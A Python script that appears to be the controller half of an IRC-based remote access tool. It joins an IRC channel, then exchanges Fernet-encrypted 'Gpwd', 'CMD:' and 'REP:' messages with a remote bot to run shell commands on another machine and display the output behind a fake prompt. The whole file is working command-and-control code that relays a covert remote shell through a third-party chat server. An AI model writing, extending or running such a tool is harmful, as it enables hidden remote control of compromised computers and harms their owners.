import socket
from cryptography import fernet
from colorama import Fore
def clearBuffer(sock,time):
    sock.settimeout(time)
    while 1:
        try:
            sock.recv(1000000)
        except socket.timeout :
            break

def main():
    server = input(f"{Fore.LIGHTGREEN_EX}[ * ] Enter the server address : {Fore.RESET}")
    while 1:
        try:
            port = int(input(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Enter the server port number : {Fore.RESET}"))
            break
        except :
            print(f"{Fore.LIGHTRED_EX}[ E ] Error The entered value is not valid!")
    channel=input(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Enter the server channel : {Fore.RESET}")
    botnick = input(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Enter the bot nickname : {Fore.RESET}")
    while 1 :
        try: 
            key = fernet.Fernet(input(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Enter the key : ").encode())
            break
        except :
            print(f"{Fore.LIGHTRED_EX}\n\n[ E ] Error The entered value is not valid!")
    def send(sock,msg):
        sock.send(f"PRIVMSG {channel} :MSG:{(key.encrypt(msg.encode())).decode()}\r\n".encode())
    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print (f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Connecting to : "+server+Fore.RESET)
    irc.connect((server, port))
    irc.send(("USER "+ botnick +" "+ botnick +" "+ botnick +" :T\n").encode())
    irc.send(("NICK "+ botnick +"\n").encode())
    irc.send(("PRIVMSG nickserv :iNOOPE\r\n").encode())
    irc.send(("JOIN "+ channel +"\n").encode())
    clearBuffer(irc,11)
    irc.settimeout(None)
    print (f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Connected !{Fore.RESET}")
    while 1:
        try:    
            clearBuffer(irc,0.5)
            irc.settimeout(None)
            send(irc , "Gpwd")
            text=irc.recv(10024).decode()
            if "REP:" in text:    
                text=text.split("REP:")[-1]
                path=key.decrypt(text.encode()).decode().strip()
                command="CMD:"+input(f"{Fore.LIGHTCYAN_EX}{socket.gethostname()}@{path}$ ")
                if "exit" in command.lower():
                    exit()
                send(irc, command)
                rep=key.decrypt(irc.recv(10024).decode().split("REP:")[-1].encode()).decode().strip()
                print("\n" + rep)
        except: 
            pass